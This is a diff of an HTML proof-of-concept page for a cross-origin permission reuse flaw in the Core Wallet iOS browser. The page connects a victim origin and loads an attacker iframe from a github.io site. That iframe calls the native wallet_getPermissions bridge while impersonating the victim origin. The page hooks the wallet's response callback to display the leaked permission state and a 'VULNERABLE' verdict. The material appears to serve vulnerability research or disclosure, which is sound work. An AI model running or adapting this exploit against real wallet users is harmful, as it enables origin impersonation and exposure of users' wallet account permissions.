@@ -2,7 +2,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Core Wallet iOS - Cross-Origin Permission Reuse</title>
+<title>Core Wallet iOS - Permission Reuse PoC</title>
 
 <style>
 body{
@@ -16,43 +16,32 @@ button{padding:10px 14px;margin:6px 0}
 pre{
   white-space:pre-wrap;
   overflow-wrap:anywhere;
-  background:#f7f7f7;
-  border:1px solid #ccc;
-  padding:12px
-}
-#verdict{
   padding:12px;
-  margin:12px 0;
+  background:#f7f7f7;
+  border:1px solid #ccc
+}
+.bad{
+  padding:12px;
   border:2px solid #b00000;
   color:#b00000;
   font-weight:bold
 }
-iframe{width:100%;height:60px;border:1px solid #ccc}
+iframe{width:100%;height:80px;border:1px solid #ccc}
 </style>
 
 <h2>Core Wallet iOS - Cross-Origin Permission Reuse</h2>
 
 <p>
-Victim / Origin A:<br>
-<b id="originA"></b>
+Victim A: <b id="a"></b><br>
+Attacker B: <b>https://azza1231.github.io</b>
 </p>
 
-<p>
-Attacker / Origin B:<br>
-<b>https://azza1231.github.io</b>
-</p>
+<button id="connect">1. Connect Origin A</button>
+<button id="attack" disabled>2. Origin B calls wallet_getPermissions as A</button>
 
-<button id="connect">
-1. Connect Origin A normally
-</button>
+<div id="verdict" class="bad" hidden></div>
 
-<button id="attack" disabled>
-2. Origin B reads A permissions
-</button>
-
-<div id="verdict" hidden></div>
-
-<pre id="log">Loading Origin B...</pre>
+<pre id="log">Loading attacker iframe...</pre>
 
 <iframe id="frame"></iframe>
 
@@ -62,19 +51,14 @@ const ATTACKER =
 
 const TEST_ID = 733731;
 
-const frame =
-  document.getElementById('frame');
-
-const log =
-  document.getElementById('log');
-
-const verdict =
-  document.getElementById('verdict');
+const frame = document.getElementById('frame');
+const log = document.getElementById('log');
+const verdict = document.getElementById('verdict');
 
 const attackerOrigin =
   new URL(ATTACKER).origin;
 
-document.getElementById('originA').textContent =
+document.getElementById('a').textContent =
   location.origin;
 
 function print(s = '') {
@@ -82,25 +66,38 @@ function print(s = '') {
 }
 
 
-// Load attacker iframe
-const child = new URL(ATTACKER);
+// Load B
+const u = new URL(ATTACKER);
 
-child.searchParams.set(
+/*
+ * cache buster supaya GitHub Pages tidak kasih attacker.html lama
+ */
+u.searchParams.set('v', Date.now());
+
+u.searchParams.set(
   'victimOrigin',
   location.origin
 );
 
-frame.src = child.href;
+frame.src = u.href;
 
 
+// Receive authenticated messages from B
 addEventListener('message', event => {
+
   if (event.source !== frame.contentWindow)
     return;
 
   if (event.origin !== attackerOrigin)
     return;
 
-  if (event.data?.type === 'READY') {
+  const d = event.data;
+
+  if (!d) return;
+
+
+  if (d.type === 'READY') {
+
     log.textContent =
 `Browser-confirmed Origin B:
 ${event.origin}
@@ -108,29 +105,51 @@ ${event.origin}
 Victim Origin A:
 ${location.origin}
 
+Child says victimOrigin:
+${d.victimOrigin}
+
+Native bridge visible in B:
+${d.bridgeVisible}
+
 Ready.`;
+
   }
 
-  if (event.data?.type === 'REQUEST_SENT') {
+
+  if (d.type === 'TRIGGER_RECEIVED') {
+
     print('');
-    print('Origin B sent native request');
+    print('[ACK] attacker.html received button #2 command');
+  }
+
+
+  if (d.type === 'REQUEST_SENT') {
+
+    print('');
+    print('[ACK] Origin B called Core native bridge');
     print('Method: wallet_getPermissions');
-    print('Actual origin: ' + event.origin);
-    print('Claimed origin: ' + location.origin);
-    print('Request ID: ' + TEST_ID);
+    print('ID: ' + d.id);
+  }
+
+
+  if (d.type === 'CHILD_ERROR') {
+
+    print('');
+    print('ATTACKER ERROR: ' + d.message);
   }
 });
 
 
-// STEP 1
+// Step 1
 document.getElementById('connect').onclick = async () => {
 
   if (!window.ethereum?.request) {
-    print('ERROR: Core provider unavailable');
+    print('Core provider unavailable.');
     return;
   }
 
   try {
+
     print('');
     print('Origin A calling eth_requestAccounts...');
 
@@ -139,12 +158,16 @@ document.getElementById('connect').onclick = async () => {
         method: 'eth_requestAccounts'
       });
 
-    print('Origin A connected:');
-    print(JSON.stringify(accounts));
+    print(
+      'Origin A connected: ' +
+      JSON.stringify(accounts)
+    );
 
-    document.getElementById('attack').disabled = false;
+    document.getElementById('attack').disabled =
+      false;
 
   } catch (e) {
+
     print(
       'Connect failed: ' +
       String(e?.message || e)
@@ -153,20 +176,24 @@ document.getElementById('connect').onclick = async () => {
 };
 
 
-// STEP 2
+// Step 2
 document.getElementById('attack').onclick = () => {
 
   print('');
-  print('=== CROSS-ORIGIN PERMISSION TEST ===');
+  print('=== CROSS-ORIGIN TEST ===');
 
   if (
     typeof window.__coreProviderRespond !== 'function'
   ) {
-    print('ERROR: Core callback unavailable');
+    print('ERROR: __coreProviderRespond unavailable');
     return;
   }
 
-  if (!window.__permissionObserver) {
+
+  /*
+   * Install observer immediately before request.
+   */
+  if (!window.__pocObserver) {
 
     const original =
       window.__coreProviderRespond;
@@ -177,7 +204,7 @@ document.getElementById('attack').onclick = () => {
         if (id === TEST_ID) {
 
           print('');
-          print('Native response to Origin-B request:');
+          print('=== CORE NATIVE RESPONSE ===');
 
           print(JSON.stringify({
             id,
@@ -186,31 +213,17 @@ document.getElementById('attack').onclick = () => {
           }, null, 2));
 
 
-          const hasPermission =
+          if (
             !error &&
             Array.isArray(result) &&
-            result.length > 0;
-
-
-          if (hasPermission) {
+            result.length > 0
+          ) {
 
             verdict.hidden = false;
 
             verdict.textContent =
-              'VULNERABLE: Cross-origin Origin B obtained permission state belonging to Origin A.';
+              'VULNERABLE: Cross-origin Origin B obtained permission state while impersonating Origin A.';
 
-            print('');
-            print('IMPACT PROVEN:');
-            print(
-              'Origin B was treated as already-authorized Origin A.'
-            );
-
-          } else {
-
-            print('');
-            print(
-              'Permission reuse not demonstrated.'
-            );
           }
         }
 
@@ -218,18 +231,23 @@ document.getElementById('attack').onclick = () => {
           this,
           arguments
         );
-    };
+      };
 
-    window.__permissionObserver = true;
+    window.__pocObserver = true;
   }
 
 
   print('Actual Origin B: ' + attackerOrigin);
   print('Origin claimed by B: ' + location.origin);
+  print('Sending command to attacker iframe...');
 
-  frame.contentWindow.postMessage({
-    type: 'GET_PERMISSIONS_AS_A',
-    id: TEST_ID
-  }, attackerOrigin);
+
+  frame.contentWindow.postMessage(
+    {
+      type: 'GET_PERMISSIONS_AS_A',
+      id: TEST_ID
+    },
+    attackerOrigin
+  );
 };
 </script>
